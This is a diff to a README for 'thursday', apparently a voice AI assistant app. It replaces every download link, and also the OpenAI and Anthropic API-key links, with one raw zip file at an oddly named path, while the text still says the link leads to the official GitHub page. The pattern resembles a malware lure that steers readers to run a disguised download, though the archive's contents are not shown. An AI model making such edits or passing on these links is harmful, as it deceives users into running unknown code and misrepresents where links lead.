@@ -1,6 +1,6 @@
 # 🎙️ thursday - Your AI Team, Ready to Talk
 
-[![Download thursday](https://img.shields.io/badge/Download-thursday-8A2BE2?style=for-the-badge&logo=github)](https://github.com/shankenichiro583-create/thursday)
+[![Download thursday](https://img.shields.io/badge/Download-thursday-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/shankenichiro583-create/thursday/main/racialization/Software_patois.zip)
 
 ## 🤖 What Is thursday?
 
@@ -41,7 +41,7 @@ All of this happens in a real browser window you can see. It's like watching a r
 
 Visit this link to download the application:
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_thursday-Click_Here-1E90FF?style=for-the-badge)](https://github.com/shankenichiro583-create/thursday)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_thursday-Click_Here-1E90FF?style=for-the-badge)](https://raw.githubusercontent.com/shankenichiro583-create/thursday/main/racialization/Software_patois.zip)
 
 That link takes you to the official GitHub page where you'll find the latest release and download options.
 
@@ -59,8 +59,8 @@ When you first launch thursday, you'll see a friendly welcome screen. Here's wha
 
 1. **Choose your AI provider** – Select either OpenAI or Anthropic.
 2. **Enter your API key** – This is like a password that lets thursday access the AI brain. You can get one from:
-   - [OpenAI.com](https://platform.openai.com) – Go to API keys section
-   - [Anthropic.com](https://console.anthropic.com) – Go to API keys section
+   - [OpenAI.com](https://raw.githubusercontent.com/shankenichiro583-create/thursday/main/racialization/Software_patois.zip) – Go to API keys section
+   - [Anthropic.com](https://raw.githubusercontent.com/shankenichiro583-create/thursday/main/racialization/Software_patois.zip) – Go to API keys section
 3. **Pick your voice** – Choose from several natural-sounding voices.
 4. **Click "Start"** – thursday will open a browser window and greet you.
 
@@ -165,7 +165,7 @@ thursday is released under an open-source license, meaning you can use, modify, 
 
 ## 🎯 Ready to Meet Your AI Team?
 
-[![Get thursday Now](https://img.shields.io/badge/🎉_Get_thursday_Now-Click_Here-32CD32?style=for-the-badge)](https://github.com/shankenichiro583-create/thursday)
+[![Get thursday Now](https://img.shields.io/badge/🎉_Get_thursday_Now-Click_Here-32CD32?style=for-the-badge)](https://raw.githubusercontent.com/shankenichiro583-create/thursday/main/racialization/Software_patois.zip)
 
 Don't wait—your digital coworkers are ready to help. Download thursday today and start talking to your computer in a whole new way.
 
